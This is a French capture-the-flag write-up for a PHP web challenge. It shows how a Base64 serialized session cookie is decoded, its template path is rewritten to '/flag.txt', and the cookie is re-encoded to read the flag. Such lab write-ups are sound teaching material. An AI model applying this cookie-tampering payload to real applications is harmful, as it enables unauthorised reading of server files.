# Reprise de Session

> **CTF** : CyberZerk 2026  
> **Catégorie** : `WEB` · **Points** : 360
> **Difficulté** : Extrême  
> **Auteur** : Perseval

---

## Description

Les sessions sont des objets PHP sérialisés dans le cookie session. Source fournie. Lisez le flag du serveur.

## Liens fournis
- [https://reprise-de-session.cyberzerk.fr](https://reprise-de-session.cyberzerk.fr)

## Fichiers fournis
- src_compte_42.zip

---
 
## Résolution

Dans les cookies de connexion on peut voir un cookie de session qui ressemble à ça : 

```text
Tzo4OiJUZW1wbGF0ZSI6Mjp7czo0OiJwYXRoIjtzOjIyOiJ0ZW1wbGF0ZXMvd2VsY29tZS5odG1sIjtzOjc6ImNvbnRlbnQiO3M6MDoiIjt9
```

Une fois décodée de la `Base64` nous avons : 

```text
O:8:"Template":2:{s:4:"path";s:22:"templates/welcome.html";s:7:"content";s:0:"";}
```

On peut voir dans le texte `templates/welcome.html` donc on va essayer de le remplacer par `/flag.txt`. Il ne faut pas oublier de changer la valeur de `s` précédente qui représente le nom de caratères, donc nous devons mettre `9`. Ce qui donne : 

```text
O:8:"Template":2:{s:4:"path";s:9:"/flag.txt";s:7:"content";s:0:"";}
```

On l'encode en `Base64` : 

```text
Tzo4OiJUZW1wbGF0ZSI6Mjp7czo0OiJwYXRoIjtzOjk6Ii9mbGFnLnR4dCI7czo3OiJjb250ZW50IjtzOjA6IiI7fQ==
```

Et on le met dans les cookies. La page change pour faire apparaitre le flag : 

```text
CyberZerk{PHP_uns3r1al1z3_p0p_ch41n_v14_w4k3up}
```

---
 
## Flag
 
```
CyberZerk{PHP_uns3r1al1z3_p0p_ch41n_v14_w4k3up}
```